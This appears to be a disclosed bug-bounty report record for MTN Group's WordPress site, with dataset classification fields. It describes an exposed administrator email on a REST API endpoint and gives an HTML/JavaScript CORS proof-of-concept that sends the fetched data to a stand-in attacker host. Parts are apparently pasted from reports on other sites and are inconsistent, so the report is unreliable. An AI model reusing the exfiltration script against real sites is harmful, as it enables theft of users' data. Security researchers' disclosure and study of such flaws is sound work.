{
    "reported_to": "MTN Group",
    "reported_by": "h0w ",
    "title": "Unauthorized access to PII leads to Administrator account Takeover",
    "content": "\nSummary:\nThis vulnerability is present in the wp-json/wp/v2/users/15 file located in the wordpress directory endpoints. This flaw arises from insufficient restrictions placed on the list of post authors, which can be exploited by remote attackers to obtain sensitive information through wp/v2/users/15 requests attackers can obtain sensitive information in the form of email addresses (PII Leaks) and will be used in wp-login to send forget password or brute-force password requests.\nDescriptions:\nAn cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page CORS misconfiguration is found on vanillaforums.com as Access-Control-Allow-Credentials: true.\nPlatform(s) Affected: [website]\nhttps://www.mtn.com/wp-json/wp/v2/users/15\nSteps To Reproduce:\nNavigate visit hostname or directory on https:\\/\\/www.mtn.com\\/wp-json\\/wp\\/v2\\/users\\/9\nIntercept request to burp-suite and you will see unauthenticated APIs administrator_login email address exposed\n<image_0>\ncopy this scripts and save file as .html and open in our browsers\nCode 771 Bytes\n1<!DOCTYPE html>\n2<html>\n3<body>\n4<center>\n5<h3>Steal administrator PII data!</h3>\n6<html>\n7<body>\n8<button type='button' onclick='cors()'>Exploit</button>\n9<p id='demo'></p>\n10<script>\n11function cors() {\n12var xhttp = new XMLHttpRequest();\n13xhttp.onreadystatechange = function() {\n14if (this.readyState == 4 && this.status == 200) {\n15var a = this.responseText; // Sensitive data from niche.co about user account\n16document.getElementById(\"demo\").innerHTML = a;\n17xhttp.open(\"POST\", \"http://burpcollaborator-intruder-evil.com\", true);// Sending that data to Attacker's website\n18xhttp.withCredentials = true;\n19console.log(a);\n20xhttp.send(\"data=\"+a);\n21}\n22};\n23xhttp.open(\"GET\", \"https://www.mtn.com/wp-json/wp/v2/users/15\", true);\n24xhttp.withCredentials = true;\n25xhttp.send();\n26}\n27</script>\n28</body>\n29</html>\n<image_1>\nSupporting Material/References:\nIt's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.\nIt's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: \"^.rest_route=/wp-json/wp/v2/users/15\") to a Not Found (404) or a Default Page.\nImpact\nAttacker get sensitive information PII Leaks (email adress)\nAttacker can brute-force the password use the valid administrator login\nCORS Misconfiguration, could lead to disclosure of sensitive information\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.\nThis website using Wordpress , so developer forget to enable authenticator in the APIs that can view information of admin user. By access to this link, attacker can get username and email_address and other information of user admin.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "Privilege Escalation"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eml9w3242aouaajavyum1c9de40o?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6GJRGFQU%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T200449Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBkFfXk5sITO6%2Fy53%2Fb6WKOz6AADhYeKHVlyIB%2BCc8t3AiEAs9W%2B62UgoolWPI%2F58bjjXfWVOeOcBzqiG50JhDeMCLEquwUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHzSwLBlIE2mvyYXfCqPBYpfUX1deuQRunTbSH3WqJGOXemIug0Q6WYsk1ItL0tXeKHJOXctqGuAMgqo7%2FlOQCNlnTYHEBhjSQCQxBkQ%2Bwgo6AGifbrWj4cXDMVjoEmryTiPgHxWru3zHVDwzcILfbMST5hTDAjgHzDyIDtSluoHA4TGxwmPC3HIFoy6gixWSzXM75lgRz982tXXhe7nRdCs7NtOTYkIgk0v0OUPVZxhNmBYgDXArCV0XYpI%2F9a%2BvupkBOn3Zw412Y89oMOFoflxnieBVazArJ%2BOyLp7AKxek9PSG2udM%2BFXiQYRENplxUto8reDCA0SmMAuWH%2FdA2t6x8leB7S%2FpInBHv6LO0k1s2jKX06RHtCEYIP01ywZkcPbFywwl8aeBjqqgF9KjE79DLeTA5HlV2FJbaOqv0%2BHipcPeoJFgeK4l1bvoDy6Vb4L%2Fyf50kaCcHCPQkYsommPeNcTv0lLMuU543U3UCSCTGfVdZzrN8Y%2Fbz9sa5FRDUWovKggIqm4B5nMrTcc%2FWoedCpKbuTf3Bp1bEgipZdQIhaaec8Yg2BibgaHvtYkmwNBPI6P8rlvSapLhGD29BVCElk3b79SbOPEeE%2Bh%2BPZ8hIBTTCu5RsiP%2BurKW1XXcnN7KwZoURlLQ4NLbu1oeTuH4aSNlHAtXJ9oUK0fYvvLAsC8rA2akJAxcn18KXR1W6Rr%2BrDhrCadrfmCwC5Nv0Xl5ryWMicYH5Dj4B69SNmqlSu6cI0qs2FAbS5n%2FBtziYQ7fW2ziGq77bzltZSFg9YfsIIh3Y7D6yhqBuKkAC0lLZoKQgStO9QdEgmeHYKTWxjQWTr3l1a9UZZ6H9sjf3DLBtboYYpb2FnzGi3TwmrrVNA4iVPcf0CuXt5iRgwws7eGvwY6sQFDfIW4fKJgjkbXkypmYF1y%2FRQxHmTkpA0XNQbzleO8gpv%2BmeQ4X9Q11PJEQDcAsz2y5PtpcHIULqQaol8OPwZX88gI08H1lkMXmpasthWO7Pq3Yw6nWgv5lJYBXitiJuaJLYKZ3XtrLWn5uTI9TzydoTNFfRgfBW32vcS110WPMMdVNE9JUNBaRe83IBZd%2BeHusGc6d%2B4FKFCXJ82W2F7PHfXihV0otC%2FdyDcv97RSB44%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5dd51e6b603321f3f0c49abe594d65749530183437f23e64aa0ad836d63226d8",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fp1tzcg4i4iitlpzmsbt3ibi102k?response-content-disposition=attachment%3B%20filename%3D%22CORS.gif%22%3B%20filename%2A%3DUTF-8%27%27CORS.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6GJRGFQU%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T200449Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBkFfXk5sITO6%2Fy53%2Fb6WKOz6AADhYeKHVlyIB%2BCc8t3AiEAs9W%2B62UgoolWPI%2F58bjjXfWVOeOcBzqiG50JhDeMCLEquwUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHzSwLBlIE2mvyYXfCqPBYpfUX1deuQRunTbSH3WqJGOXemIug0Q6WYsk1ItL0tXeKHJOXctqGuAMgqo7%2FlOQCNlnTYHEBhjSQCQxBkQ%2Bwgo6AGifbrWj4cXDMVjoEmryTiPgHxWru3zHVDwzcILfbMST5hTDAjgHzDyIDtSluoHA4TGxwmPC3HIFoy6gixWSzXM75lgRz982tXXhe7nRdCs7NtOTYkIgk0v0OUPVZxhNmBYgDXArCV0XYpI%2F9a%2BvupkBOn3Zw412Y89oMOFoflxnieBVazArJ%2BOyLp7AKxek9PSG2udM%2BFXiQYRENplxUto8reDCA0SmMAuWH%2FdA2t6x8leB7S%2FpInBHv6LO0k1s2jKX06RHtCEYIP01ywZkcPbFywwl8aeBjqqgF9KjE79DLeTA5HlV2FJbaOqv0%2BHipcPeoJFgeK4l1bvoDy6Vb4L%2Fyf50kaCcHCPQkYsommPeNcTv0lLMuU543U3UCSCTGfVdZzrN8Y%2Fbz9sa5FRDUWovKggIqm4B5nMrTcc%2FWoedCpKbuTf3Bp1bEgipZdQIhaaec8Yg2BibgaHvtYkmwNBPI6P8rlvSapLhGD29BVCElk3b79SbOPEeE%2Bh%2BPZ8hIBTTCu5RsiP%2BurKW1XXcnN7KwZoURlLQ4NLbu1oeTuH4aSNlHAtXJ9oUK0fYvvLAsC8rA2akJAxcn18KXR1W6Rr%2BrDhrCadrfmCwC5Nv0Xl5ryWMicYH5Dj4B69SNmqlSu6cI0qs2FAbS5n%2FBtziYQ7fW2ziGq77bzltZSFg9YfsIIh3Y7D6yhqBuKkAC0lLZoKQgStO9QdEgmeHYKTWxjQWTr3l1a9UZZ6H9sjf3DLBtboYYpb2FnzGi3TwmrrVNA4iVPcf0CuXt5iRgwws7eGvwY6sQFDfIW4fKJgjkbXkypmYF1y%2FRQxHmTkpA0XNQbzleO8gpv%2BmeQ4X9Q11PJEQDcAsz2y5PtpcHIULqQaol8OPwZX88gI08H1lkMXmpasthWO7Pq3Yw6nWgv5lJYBXitiJuaJLYKZ3XtrLWn5uTI9TzydoTNFfRgfBW32vcS110WPMMdVNE9JUNBaRe83IBZd%2BeHusGc6d%2B4FKFCXJ82W2F7PHfXihV0otC%2FdyDcv97RSB44%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=775597352dc22048bcbb560e6e044b8a04dc197c28fc2d456530ea01368fc4f3"
    },
    "disclosed_date": 1740257280,
    "report_url": "https://hackerone.com/reports/2450685",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Navigate to https://www.mtn.com/wp-json/wp/v2/users/15"
        ],
        [
            2,
            "Intercept the request with Burp Suite or browser developer tools to observe the exposed administrator email address (PII)"
        ],
        [
            3,
            "Create an HTML file with the provided exploit script and open it in a browser"
        ],
        [
            4,
            "Click the 'Exploit' button to send the stolen data to an attacker-controlled server"
        ]
    ],
    "vuln_description": "The vulnerability involves unauthorized access to Personally Identifiable Information (PII) via a WordPress REST API endpoint (wp-json/wp/v2/users/15) that exposes administrator email addresses without authentication. This information can be used for password reset attacks or brute-force attempts. Additionally, a CORS misconfiguration (Access-Control-Allow-Credentials: true) allows attackers to steal this data via a malicious website when visited by a logged-in user.",
    "reason": "The vulnerability is relatively straightforward to discover as it involves accessing a well-known WordPress REST API endpoint and observing the exposed data. The CORS misconfiguration is also a common issue that can be easily tested. No complex application state manipulation or novel logic is required.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "idor_detectable": true,
    "authnz_byppass_detectable": true,
    "is_simple_payload": false,
    "injection_metadata": {
        "is_simple_payload": false
    },
    "authnz_metadata": {
        "idor_detectable": true,
        "authnz_byppass_detectable": true
    }
}